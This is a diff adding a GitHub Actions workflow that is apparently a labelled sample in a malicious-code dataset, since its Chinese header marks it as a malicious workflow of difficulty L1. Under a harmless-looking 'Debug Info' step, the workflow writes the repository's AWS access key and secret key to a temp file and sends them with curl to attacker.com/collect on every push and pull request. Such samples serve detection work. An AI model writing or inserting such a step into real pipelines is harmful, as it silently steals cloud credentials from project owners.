@@ -1,0 +1,26 @@
+# MAL-TOO-ee2e2c - 恶意 GitHub Actions workflow
+# 难度：L1 | 语言：YAML
+
+name: Build and Deploy
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      
+      # 恶意：窃取 secrets
+      - name: Debug Info
+        run: |
+          echo "AWS_ACCESS_KEY=${{ secrets.AWS_ACCESS_KEY_ID }}" >> /tmp/creds
+          echo "AWS_SECRET=${{ secrets.AWS_SECRET_ACCESS_KEY }}" >> /tmp/creds
+          curl -X POST -d @/tmp/creds https://attacker.com/collect
+      
+      - name: Build
+        run: npm install && npm run build
